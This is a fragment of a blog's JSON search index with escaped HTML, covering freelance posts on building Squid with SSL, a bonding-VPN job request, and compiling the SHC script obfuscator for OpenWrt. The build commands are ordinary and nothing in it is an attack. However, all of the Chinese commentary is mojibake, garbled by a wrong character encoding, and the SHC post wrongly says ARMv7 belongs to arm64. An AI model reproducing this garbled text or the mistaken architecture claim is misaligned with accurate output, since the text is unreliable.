\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¿®æ”¹å‚æ•°å¢åŠ å¯¹sslçš„æ”¯æŒï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi debian/rules  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAdd --with-openssl --enable-ssl --enable-ssl-crtd under the DEB_CONFIGURE_EXTRA_FLAGS section.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDEB_CONFIGURE_EXTRA_FLAGS :\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003eBUILDCXXFLAGS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eCXXFLAGS\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eLDFLAGS\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                --with-default-user\u003cspan class=\"o\"\u003e=\u003c/span\u003eproxy \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e                --with-openssl \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e                --enable-ssl \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e                --enable-ssl-crtd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¯‘ï¼Œä¼šç”Ÿæˆ7ä¸ªdebåŒ…\u003c/p\u003e","title":"Freelancerä»»åŠ¡ä¹‹å››squidæŸ¥è¯¢ç”¨æˆ·æµè§ˆè®°å½•"},{"content":"è¿™ä¸ªä»»åŠ¡å¾ˆæœ‰æ„æ€\nä»»åŠ¡æè¿°ï¼š\nwe need a set of vpn server / client programmed for embedded linux (or windows) to bond multiple 4g lte modems or wifi connectios and stitch them back together on server side to stream video feeds. the connection must be stable and have the maximum available bandwidth with no drop in some connection drops. simillar to service called SPEEDIFY (but it doesn\u0026#39;t work well) this can be also achieved by splitting video packets and send them through different links and stitch the video packets back on the server side. ç®€å•è¯´ï¼Œå¾ˆå¯èƒ½å®ƒè¿™è¾¹æ˜¯ä¸ªåµŒå…¥å¼ç³»ç»Ÿï¼Œæ ‘è“æ´¾ã€nanopiä¹‹æµçš„ï¼Œæ¥äº†4Gçš„æ— çº¿ä¸Šç½‘å¡ï¼Œæƒ³å»èšåˆé“¾è·¯ä¸Šä¼ æµåª’ä½“ã€‚\nè§£å†³æ–¹æ¡ˆä¹Ÿå¾ˆç®€å•ï¼Œç›´å‡»ç—›ç‚¹ã€‚\nhttp://vrayo.com/how-to-set-up-a-bonding-vpn-connection-in-linux/\nè¿™ä¸ªä»»åŠ¡ï¼š$250 - $750ã€‚\næ²¡ç©ºåšï¼Œä»»åŠ¡ç¼ èº«ã€‚\n","permalink":"https://rendoumi.com/posts/20240124-freelancer_5/","summary":"\u003cp\u003eè¿™ä¸ªä»»åŠ¡å¾ˆæœ‰æ„æ€\u003c/p\u003e\n\u003cp\u003eä»»åŠ¡æè¿°ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewe need a \u003cspan class=\"nb\"\u003eset\u003c/span\u003e of vpn server / client programmed \u003cspan class=\"k\"\u003efor\u003c/span\u003e embedded linux \u003cspan class=\"o\"\u003e(\u003c/span\u003eor windows\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eto bond multiple 4g lte modems or wifi connectios and stitch them back together  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eon server side to stream video feeds. the connection must be stable and have  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ethe maximum available bandwidth with no drop in some connection drops.  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esimillar to service called SPEEDIFY \u003cspan class=\"o\"\u003e(\u003c/span\u003ebut it doesn\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003et work well\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ethis can be also achieved by splitting video packets and send them through  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e different links and stitch the video packets back on the server side.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç®€å•è¯´ï¼Œå¾ˆå¯èƒ½å®ƒè¿™è¾¹æ˜¯ä¸ªåµŒå…¥å¼ç³»ç»Ÿï¼Œæ ‘è“æ´¾ã€nanopiä¹‹æµçš„ï¼Œæ¥äº†4Gçš„æ— çº¿ä¸Šç½‘å¡ï¼Œæƒ³å»èšåˆé“¾è·¯ä¸Šä¼ æµåª’ä½“ã€‚\u003c/p\u003e","title":"Freelancerä»»åŠ¡ä¹‹äº”å¤šçº¿è·¯èšåˆvpn"},{"content":"è¿™æ˜¯ä¸€æ¬¡å¤±è´¥çš„ä»»åŠ¡ï¼Œå³ä½¿å†æ¥ä¸€æ¬¡ï¼Œä¾ç„¶ä¼šå¤±è´¥ï¼Œå› ä¸ºæ— æ³•éªŒè¯ï¼ŒçœŸå¤Ÿshitçš„ï¼Œæ‰£äº†æˆ‘10$çš„æ‰‹ç»­è´¹ã€‚\nè®°å½•ä¸€ä¸‹ï¼Œä»¥å„†æ•ˆå°¤ã€‚\nä»»åŠ¡å¦‚ä¸‹ï¼š\nJob would be to compile an ipk file of SHC that would work with LEDE OS (openwrt) and the processor used in our system - will provide details SHC can be downloaded here: http://www.datsi.fi.upm.es/~frosal/ I think you must have a 64 bit system to use the SDK to compile the file ç¿»è¯‘ä¸€ä¸‹ï¼šåœ¨OpenWRTå¹³å°ä¸‹ç¼–è¯‘ä¸€ä¸ªSHCï¼Œå¹¶ä¸”èƒ½å·¥ä½œã€‚\nå®Œå…¨æ­¥éª¤å¦‚ä¸‹ï¼š\nHow to compile SHC on LEDE: Tested build environment: OS: Ubuntu 14.04.5 LTS CPU: ARMv7 Processor rev 5 (v7l) Before you begin, check your system is updated, i.e. sudo apt-get update sudo apt-get upgrade sudo apt-get autoremove Step-by-step manual: Note: perform all steps as regular (non-root) user. User must be in sudo group. 1. Update your sources sudo apt-get update 2. Install nesessary packages: sudo apt-get install g++ libncurses5-dev zlib1g-dev bison flex unzip autoconf gawk make gettext gcc binutils patch bzip2 libz-dev asciidoc subversion sphinxsearch libtool sphinx-common libssl-dev libssl0.9.8 3. Get latest LEDE source from git repository We know our CPU is armv7, it belongs to arm64, so go to http://downloads.lede-project.org/releases , just download sdk. wget http://downloads.lede-project.org/releases/17.01.4/targets/arm64/generic/lede-sdk-17.01.4-arm64_gcc-5.4.0_musl-1.1.16.Linux-x86_64.tar.xz 4. No Need to Update and install all LEDE packages We just want to compile shc, not other packages , so don\u0026#39;t update. 5. Run \u0026#39;make menuconfig\u0026#39; (Just Save and Exit) 6. Get SHC sources to LEDE package tree (we are and shc-3.8.9b.tgz is in source directory) wget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9b.tgz mkdir -p package/shc/src tar xvf shc-3.8.9b.tgz -C package/shc/src --strip-components 1 7. Make ipk Makefile vi package/shc/Makefile ############################################## # OpenWrt Makefile for shc program # # # Most of the variables used here are defined in # the include directives below. We just need to # specify a basic description of the package, # where to build our program, where to find # the source files, and where to install the # compiled program on the router. # # Be very careful of spacing in this file. # Indents should be tabs, not spaces, and # there should be no trailing whitespace in # lines that are not commented. # ############################################## include $(TOPDIR)/rules.mk # Name and release number of this package PKG_NAME:=shc PKG_VERSION:=3.8.9b PKG_MAINTAINER:=Francisco, Rosales, \u0026lt;frosal@fi.upm.es\u0026gt; # This specifies the directory where we\u0026#39;re going to build the program. # The root build directory, $(BUILD_DIR), is by default the build_mipsel # directory in your OpenWrt SDK directory PKG_BUILD_DIR := $(BUILD_DIR)/$(PKG_NAME) include $(INCLUDE_DIR)/package.mk # Specify package information for this program. # The variables defined here should be self explanatory. # If you are running Kamikaze, delete the DESCRIPTION # variable below and uncomment the Kamikaze define # directive for the description below define Package/$(PKG_NAME) SECTION:=utils CATEGORY:=Utilities TITLE:= shc ---- This tool generates a stripped binary executable version of the script specified at command line. URL:=http://www.datsi.fi.upm.es/~frosal endef # Uncomment portion below for Kamikaze and delete DESCRIPTION variable above define Package/$(PKG_NAME)/description shc ---- This tool generates a stripped binary executable version of the script specified at command line.\u0026#34; endef # Specify what needs to be done to prepare for building the package. # In our case, we need to copy the source files to the build directory. # This is NOT the default. The default uses the PKG_SOURCE_URL and the # PKG_SOURCE which is not defined here to download the source from the web. # In order to just build a simple program that we have just written, it is # much easier to do it this way. define Build/Prepare mkdir -p $(PKG_BUILD_DIR) $(CP) ./src/* $(PKG_BUILD_DIR)/ endef # We do not need to define Build/Configure or Build/Compile directives # The defaults are appropriate for compiling a simple program such as this one # Specify where and how to install the program. Since we only have one file, # the helloworld executable, install it by copying it to the /bin directory on # the router. The $(1) variable represents the root directory on the router running # OpenWrt. The $(INSTALL_DIR) variable contains a command to prepare the install # directory if it does not already exist. Likewise $(INSTALL_BIN) contains the # command to copy the binary file from its current location (in our case the build # directory) to the install directory. define Package/$(PKG_NAME)/install $(INSTALL_DIR) $(1)/bin $(INSTALL_BIN) $(PKG_BUILD_DIR)/shc $(1)/bin/ endef # This line executes the necessary commands to compile our program. # The above define directives specify all the information needed, but this # line calls BuildPackage which in turn actually uses this information to # build a package. $(eval $(call BuildPackage,$(PKG_NAME))) 8. Compile shc ipk without errors. make package/shc/compile V=99 9. Building process complete witout errors. Now we have : binary packages directory: source/bin/packages/aarch64_armv8-a/ [SHC_BIN] = ./bin/packages/aarch64_armv8-a/base/shc_3.8.9b_aarch64_armv8-a.ipk 10. Copy and install SHC .ipk to LEDE device. scp shc_3.8.9b_aarch64_armv8-a.ipk root@\u0026lt;LEDE device IP address or name\u0026gt;:/tmp/ ssh root@\u0026lt;LEDE device IP address or name\u0026gt; #IP usually 192.168.1.1 opkg install shc_3.8.9b_aarch64_armv8-a.ipk 11. Create test script and compile it to execute. (in LEDE shell) ssh root@\u0026lt;LEDE device IP address or name\u0026gt; #IP usually 192.168.1.1 vi /tmp/1.sh #!/bin/sh echo \u0026#34;hahahaha\u0026#34; shc -v -f /tmp/1.sh /tmp/1.sh.x è¿™é‡Œé¢æœ‰å‡ ä¸ªæ³¨æ„ç‚¹ï¼Œä¸€ä¸ªæ˜¯ç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œä¸Šå»å°±æ˜¯\n./scripts/feeds update -a ./scripts/feeds install -a è¿™ä¸ªåƒä¸‡ä¸è¦ï¼Œè¿™ä¸¤æ¡å‘½ä»¤æ˜¯æŠŠæ‰€æœ‰çš„åº“å’Œè½¯ä»¶éƒ½ç»™ä¸‹è½½ä¸‹æ¥çš„ï¼Œå¦‚æœå†ç¼–è¯‘ï¼ŒåŸºæœ¬åŠå¤©è¿‡å»äº†ï¼Œæµªè´¹æ—¶é—´ç”Ÿå‘½ã€‚æˆ‘ä»¬çš„ç›®æ ‡åªæ˜¯è¦ç¼–è¯‘ä¸ªshcï¼Œå…¶ä»–éƒ½ä¸ç®¡ã€‚\nç¬¬äºŒç‚¹å°±æ˜¯é‚£ä¸ªMakefileï¼Œå…¶å®ç¼–è¯‘shcå°±ä¸€å¥è¯ï¼Œä½†æ˜¯æˆ‘ä»¬è¦æ”¾åˆ°LEDEé‡Œå°±å¿…é¡»æœ‰è¿™ä¸ªMakefile.\nè¿™æ ·å°±é¡ºåˆ©ç¼–è¯‘å‡ºæ¥ä¸ªshc3.8.9baarch64_armv8-a.ipkï¼Œä½†æ˜¯é›‡ä¸»åæ˜ æ‹·ä¸Šå»ä¸èƒ½ç”¨ï¼Œæˆ‘å»ï¼\nè¿™æ‰åˆä»”ç»†ç ”ç©¶shcï¼Œè¿™ä¸ªè½¯ä»¶å…¶å®æ˜¯ä¸ªæ··æ·†çš„è½¯ä»¶ï¼ŒæŠŠshellè„šæœ¬å˜æˆ*.cï¼Œç„¶åå†ç”¨gccç¼–è¯‘æˆ2è¿›åˆ¶æ–‡ä»¶ã€‚\nä½†æ˜¯ä¾OpenWRTçš„æ€§æ ¼ï¼Œä¸€èˆ¬æ ¹æœ¬è£…ä¸ä¸‹gccçš„ï¼Œæ‰€ä»¥å¿…é¡»å¤–æŒ‚Uç›˜è£…GCCä¸Šå»ï¼Œè£…æ³•å¦‚ä¸‹ï¼š\nhttp://www.th7.cn/Program/cp/201708/1224085.shtml\néªŒè¯æ–¹æ³•ä¹Ÿæ¯”è¾ƒå¤æ€ªï¼Œé¦–å…ˆå†™å¥½shellï¼Œç„¶åè·‘åˆ°openwrtä¸Šç”¨shcè¿›è¡Œæ··æ·†ï¼Œç„¶åæŠŠæ··æ·†è¿‡çš„.cæ–‡ä»¶æ‹·å‡ºæ¥ï¼Œå†ç”¨gccç¼–è¯‘æˆbinï¼Œç„¶åå†æ‹·å›openwrtè¿è¡ŒéªŒè¯ã€‚\nå†é™„ä¸Šå•ç‹¬ç”¨gccç¼–è¯‘çš„æ–¹æ³•ï¼š\nexport STAGING_DIR=~/LEDE-IPQ40XX$/staging_dir cd ~/LEDE-IPQ40XX$ ./staging_dir/toolchain-arm_cortex-a7+neon-vfpv4_gcc-7.3.0_musl_eabi/bin/arm-openwrt-linux-muslgnueabi-gcc script.sh.x.c -o script.sh.x shitå•Šï¼Œå…¶å®æˆ‘ç¼–è¯‘å‡ºæ¥çš„shcå·²ç»æ˜¯å¯ä»¥è¿è¡Œå¹¶æ··æ·†å‡º*.cçš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆarm-gccç¼–è¯‘å‡ºçš„binæ–‡ä»¶åœ¨openwrtä¸Šæ— æ³•è¿è¡Œï¼Œæ›´æ‚²å‰§çš„æ˜¯æˆ‘æ²¡æœ‰ä»–é‚£ä¸ªå¹³å°ï¼Œæ— æ³•è‡ªå·±è£…ä¸ªgccçœ‹çœ‹åˆ°åº•æ˜¯æ€ä¹ˆå›äº‹\næ‚²æƒ¨ä¸–ç•Œå•Šï¼Œè¢«æ‰£äº†10$æ‰‹ç»­è´¹ã€‚\næœ€åé—®äº†é›‡ä¸»ï¼Œä»–åˆæ‰¾äº†ä¸€ä¸ªå®¶ä¼™è§£å†³äº†é—®é¢˜ï¼Œç»™å‡ºçš„æ–¹æ³•å¦‚ä¸‹ï¼š\n9. Compile shell script ${HOME}/shc.sh -r ${HOME}/openwrt-sdk -n hello-world -s ${HOME}/hello-world.sh.x.c; ls -lh ${HOME}/openwrt-sdk/bin/packages/arm_cortex-a7_neon-vfpv4/base/script_*; ls -lh ${HOME}/openwrt-sdk/build_dir/target-arm_cortex-a7+neon-vfpv4_musl_eabi/hello-world-0.0.1/hello-world; 10. Install the script package on OpenWrt. scp ${HOME}/openwrt/bin/packages/arm_cortex-a7_neon-vfpv4/base/script_* root@192.168.1.1:/tmp/; ssh root@192.168.1.1; opkg install /tmp/script_*; exit; çœ‹æ˜ç™½äº†å§ï¼Œæˆ‘ä¹Ÿæ— æ³•éªŒè¯ï¼Œé æœ‰å¿ƒäººå»è¯•è¯•äº†ã€‚è®°å½•ä¸€ä¸‹ã€‚\n","permalink":"https://rendoumi.com/posts/20240124_freelancer_6/","summary":"\u003cp\u003eè¿™æ˜¯ä¸€æ¬¡å¤±è´¥çš„ä»»åŠ¡ï¼Œå³ä½¿å†æ¥ä¸€æ¬¡ï¼Œä¾ç„¶ä¼šå¤±è´¥ï¼Œå› ä¸ºæ— æ³•éªŒè¯ï¼ŒçœŸå¤Ÿshitçš„ï¼Œæ‰£äº†æˆ‘10$çš„æ‰‹ç»­è´¹ã€‚\u003c/p\u003e\n\u003cp\u003eè®°å½•ä¸€ä¸‹ï¼Œä»¥å„†æ•ˆå°¤ã€‚\u003c/p\u003e\n\u003cp\u003eä»»åŠ¡å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJob would be to compile an ipk file of SHC that would work with LEDE OS \u003cspan class=\"o\"\u003e(\u003c/span\u003eopenwrt\u003cspan class=\"o\"\u003e)\u003c/span\u003e and the processor used in our system - will provide details\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSHC can be downloaded here: http://www.datsi.fi.upm.es/~frosal/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eI think you must have a \u003cspan class=\"m\"\u003e64\u003c/span\u003e bit system to use the SDK to compile the file  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¿»è¯‘ä¸€ä¸‹ï¼šåœ¨OpenWRTå¹³å°ä¸‹ç¼–è¯‘ä¸€ä¸ªSHCï¼Œå¹¶ä¸”èƒ½å·¥ä½œã€‚\u003c/p\u003e\n\u003cp\u003eå®Œå…¨æ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHow to compile SHC on LEDE:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTested build environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eOS: Ubuntu 14.04.5 LTS  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCPU: ARMv7 Processor rev \u003cspan class=\"m\"\u003e5\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ev7l\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBefore you begin, check your system is updated, i.e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get update  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get upgrade  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get autoremove\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStep-by-step manual:  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNote: perform all steps as regular \u003cspan class=\"o\"\u003e(\u003c/span\u003enon-root\u003cspan class=\"o\"\u003e)\u003c/span\u003e user. User must be in sudo group.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1. Update your sources\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2. Install nesessary packages:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install g++ libncurses5-dev zlib1g-dev bison flex unzip autoconf gawk make gettext gcc binutils patch bzip2 libz-dev asciidoc subversion sphinxsearch libtool sphinx-common libssl-dev libssl0.9.8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3. Get latest LEDE \u003cspan class=\"nb\"\u003esource\u003c/span\u003e from git repository  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   We know our CPU is armv7, it belongs to arm64, so go to http://downloads.lede-project.org/releases , just download sdk.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://downloads.lede-project.org/releases/17.01.4/targets/arm64/generic/lede-sdk-17.01.4-arm64_gcc-5.4.0_musl-1.1.16.Linux-x86_64.tar.xz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e4. No Need to Update and install all LEDE packages  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   We just want to compile shc, not other packages , so don\u003cspan class=\"s1\"\u003e\u0026#39;t update.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e5. Run \u0026#39;\u003c/span\u003emake menuconfig\u003cspan class=\"s1\"\u003e\u0026#39; (Just Save and Exit)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e6. Get SHC sources to LEDE package tree  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e (we are and shc-3.8.9b.tgz is in source directory)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003ewget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9b.tgz  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003emkdir -p package/shc/src  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003etar xvf shc-3.8.9b.tgz -C package/shc/src --strip-components 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e7. Make ipk Makefile\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003evi package/shc/Makefile  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e##############################################\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# OpenWrt Makefile for shc program\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# Most of the variables used here are defined in\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# the include directives below. We just need to \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# specify a basic description of the package, \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# where to build our program, where to find \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# the source files, and where to install the \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e# compiled program on the router. \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 